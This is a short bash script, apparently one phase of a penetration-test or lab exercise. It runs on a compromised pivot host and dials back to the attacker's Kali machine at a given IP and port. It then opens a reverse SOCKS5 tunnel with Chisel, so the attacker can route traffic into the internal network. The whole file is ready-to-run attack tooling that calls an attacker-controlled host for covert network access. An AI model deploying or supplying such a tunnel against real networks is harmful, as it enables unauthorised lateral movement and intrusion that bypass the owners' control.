#!/usr/bin/env bash
# chisel_client.sh — Phase 5. Run on the PIVOT (PIVOT01). Dials back to the
# attacker's Chisel server and establishes a reverse SOCKS5 tunnel.
#
# Usage:  ./chisel_client.sh [kali_ip] [port]   (defaults 172.16.10.5 8080)
set -euo pipefail

KALI="${1:-172.16.10.5}"
PORT="${2:-8080}"
CHISEL="$(command -v chisel || echo /usr/local/bin/chisel)"

if [ ! -x "$CHISEL" ]; then
  echo "[!] chisel binary not found (looked in PATH and /usr/local/bin/chisel)." >&2
  exit 1
fi

echo "[*] Connecting to Chisel server ${KALI}:${PORT}"
echo "[*] R:socks  => exposes a SOCKS5 proxy on the SERVER (Kali) at 127.0.0.1:1080"
echo "[*] Leave this running; Ctrl-C to stop."
exec "$CHISEL" client "${KALI}:${PORT}" R:socks
